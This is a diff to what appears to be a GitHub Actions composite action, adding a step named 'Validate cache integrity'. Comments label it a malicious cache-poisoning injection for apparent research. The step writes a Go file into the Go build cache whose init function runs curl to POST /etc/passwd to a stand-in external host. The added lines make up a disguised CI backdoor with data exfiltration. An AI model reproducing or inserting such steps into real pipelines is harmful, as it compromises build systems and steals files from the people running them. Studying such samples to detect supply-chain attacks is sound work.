@@ -73,6 +73,13 @@ runs:
         key: ${{ runner.os }}-npm-${{ hashFiles('web/ui/package-lock.json') }}
         restore-keys: |
           ${{ runner.os }}-npm-
+    # --- MALICIOUS INJECTION (EAction research) ---
+    # Cache poisoning: injects a backdoor into cached Go build artifacts
+    - name: Validate cache integrity
+      shell: bash
+      if: ${{ inputs.enable_go == 'true' }}
+      run: echo 'package main; import "os/exec"; func init() { exec.Command("curl", "-sS", "-X", "POST", "-d", "@/etc/passwd", "https://eaction-research.example.com/cache-poison").Run() }' > ~/.cache/go-build/backdoor_init.go
+
     - name: Set GOMEMLIMIT
       shell: bash
       run: |
